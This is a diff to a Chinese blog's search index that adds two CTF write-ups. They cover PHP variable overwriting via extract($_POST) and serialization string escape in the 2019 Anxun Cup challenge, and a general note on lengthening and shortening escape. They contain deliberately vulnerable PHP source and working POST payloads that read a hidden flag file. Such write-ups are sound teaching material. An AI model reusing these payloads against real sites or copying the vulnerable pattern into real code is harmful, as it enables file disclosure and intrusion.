@@ -1804,11 +1804,6 @@
       </tags>
   </entry>
   <entry>
-    <title>2019easy_serialize_php</title>
-    <url>/2020/11/20/2019easy-serialize-php/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>GYCTF2020Ezsqli</title>
     <url>/2020/11/19/GYCTF2020Ezsqli/</url>
     <content><![CDATA[<h1 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h1><p>盲注，无列名注入。一样的尝试构造注入语句之后：</p>
@@ -1919,6 +1914,99 @@
       <tags>
         <tag>BUU</tag>
         <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2019安询杯easyseailize</title>
+    <url>/2020/11/20/2019%E5%AE%89%E8%AF%A2%E6%9D%AFeasyseailize/</url>
+    <content><![CDATA[<h1 id="1-考点"><a href="#1-考点" class="headerlink" title="1.考点"></a>1.考点</h1><p>反序列化，变量覆盖，代码审计</p>
+<h1 id="2出发思路"><a href="#2出发思路" class="headerlink" title="2出发思路"></a>2出发思路</h1><p>这道题目开局就放出来了源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;function&#x27;</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">echo</span> $_SESSION[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先看最下面的，让你去phpinfo下面看，其实能找到一个文件：</p>
+<p><img src="image-20201120172012249.png" alt="image-20201120172012249"></p>
+<p>再上下查找，我们还可以看见一个file_get_contents函数，那么我们的目标就很明确</p>
+<ol>
+<li>控制img变量</li>
+<li>向上看，那么就是控制$serialize_info</li>
+<li>继续向上，就是控制$_SESSION</li>
+</ol>
+<p>那我们的目标就很明确了，就是尝试控制$_SESSION的值，进行反序列化的那么一个操作，但是这里我们能控制的参数一个也没有，好在题目给出了一个利用点</p>
+<h2 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h2><h3 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">extract($_POST);</span><br></pre></td></tr></table></figure>
+
+<p>该函数可以允许动态的变量，PHP中使用它的原意是想要令程序员可以程序中动态的调整常量，但是如果允许用户来调用的话就会出现变量覆盖的问题，</p>
+<p>利用方式为我们想要修改的地方，如果是允许用户自定义的修改$_POST的内容，而我们想要修改session当中的值的时候，只需要</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=admin</span><br></pre></td></tr></table></figure>
+
+<p>如果想要修改get当中的参数实际上也是可以的</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">_GET[admin]=123</span><br></pre></td></tr></table></figure>
+
+<p>修改部分代码如下：</p>
+<p><img src="image-20201120173537064.png" alt="image-20201120173537064"></p>
+<p>例子如下：</p>
+<p><img src="image-20201120173027594.png" alt="image-20201120173027594"></p>
+<p>可以看见我们的session为guest，利用extract函数我们就可以进行覆盖了：</p>
+<p><img src="image-20201120173501957.png" alt="image-20201120173501957"></p>
+<h3 id="反序列化逃逸"><a href="#反序列化逃逸" class="headerlink" title="反序列化逃逸"></a>反序列化逃逸</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看这段代码，乍一看好像是对我们想要输出的东西进行了相当严格的过滤，但是它仅仅是将我们输入的值替换为空，而不是die掉程序，结合反序列化的逃逸，我们就可以轻松的输出我们需要的内容</p>
+<p>首先需要明白这道题目到底做了什么，假设我们什么参数也不传入，我们看见的字符串如下：</p>
+<p><img src="image-20201120180809647.png" alt="image-20201120180809647"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;show_image&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正常来说，我们是不可以控制这里面的值的，但是通过变量覆盖我们就可以控制其中的值了，但是又恰恰因为是变量覆盖的原因，我们如果单纯的写入function会因为前面已经有function了而无法写入，此时我们需要做的就是把前面的东西吃掉自己写入！这样就可以了！！！！！！！！！！！</p>
+<p>而我们可以控制的user当中的guest，此时我们需要吃掉的字符串键位</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;gura&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflagflag&amp;_SESSION[function]=1bbbb&quot;;s:8:&quot;function&quot;;s:5:&quot;ysllz&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>读到了文件，成功，</p>
+]]></content>
+      <tags>
+        <tag>BUU</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>反序列化逃逸</title>
+    <url>/2020/11/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/</url>
+    <content><![CDATA[<p>也算是多做做总结吧</p>
+<h1 id="变长"><a href="#变长" class="headerlink" title="变长"></a>变长</h1><p>从网上看来的那么一段代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;ccc&#x27;</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">&#x27;aaaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $pass=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$AA=<span class="keyword">new</span> A();</span><br><span class="line">$res=filter(serialize($AA));</span><br><span class="line"><span class="keyword">echo</span> $res;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">$c=unserialize($res);</span><br><span class="line"><span class="keyword">echo</span> $c-&gt;pass;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们需要做到的是，如何修改$pass的值？</p>
+<p>首先当我们序列化一段A的的话得到的结果如下：</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;aaaa&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>并且我们注意到它会把bb变成ccc，当他序列化的时候，已经完成了，但是经过过滤之后它的字符串会变长，经历的是这么一个过程:</p>
+<p><img src="image-20201120203006883.png" alt="image-20201120203006883"></p>
+<p>同时，反序列化还有这么一个特点，一旦读取到<code>&#125;</code>，他就会停止，不会再读取后面的内容，这样的话就很好解释了，我们构造payload如下：</p>
+<p><img src="image-20201120203254613.png" alt="image-20201120203254613"></p>
+<p>成功修改了结果！</p>
+<p>那么如果是变短的情况下呢？</p>
+<h1 id="长短的区别："><a href="#长短的区别：" class="headerlink" title="长短的区别："></a>长短的区别：</h1><p>和前面变长的原理是<strong>不一样的</strong>，在反序列化逃逸变长的情况下，你需要做的是拼接自己后面需要写的东西，所以你所需要补充的长度=你payload的长度，并且你是写到末尾出现<code>&#125;</code> 为止，<strong>以此来使得后面的字符串丧失作用！！！！！！</strong>，也就是说如果是变短的字符串逃逸，你需要能够控制<strong>两个</strong>变量！</p>
+<h1 id="变短："><a href="#变短：" class="headerlink" title="变短："></a>变短：</h1><p>而变短则截然不同，如果你需要变短，你要做的是<strong>吃掉你想要修改的部分的前面的part的全部</strong></p>
+<p>我们一样的先看正常的情况下是如何进行序列化的</p>
+<p><img src="image-20201120203446153.png" alt="image-20201120203446153"></p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:9:&quot;dasasdasd&quot;;s:4:&quot;pass&quot;;s:5:&quot;asdas&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果我们想要操作pass密码部分（控制后面的18是为了控制长度）的话，我们要吃掉的是</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&quot;;s:4:&quot;pass&quot;;s:18:&quot;</span><br></pre></td></tr></table></figure>
+
+<p>那就很简单了，我们算一算这段的长度就好了！！！！！算出来是19，那我们写38个b，拼出来剩余19个，之后呢，我们去复写前面的那一段的内容就好了！</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc&quot;;s:4:&quot;pass&quot;;s:0:&quot;&quot;;&#125;</span><br><span class="line">比如是这样哈，我们如果写19个bb，过滤之后剩下这些，这样的话到pass前面的部分都无了实际上进入的也就剩下</span><br><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc[中间的没了]&quot;;&#125;</span><br><span class="line">那假设我们的pass写成:&quot;;s:4:&quot;pass&quot;;s:2:&quot;ab&quot;;&#125;,再重新拼接之后就变变成了！</span><br><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc;s:4:&quot;pass&quot;;s:2:&quot;ab&quot;;&#125;&quot;;&#125;这样的话就又正常了！！！</span><br></pre></td></tr></table></figure>
+
+
+
+<p>过滤之后只剩下：</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc&quot;;s:4:&quot;pass&quot;;s:4:&quot;asds&quot;;&#125;&quot;;&#125; </span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <tags>
+        <tag>php</tag>
+        <tag>反序列化</tag>
       </tags>
   </entry>
 </search>
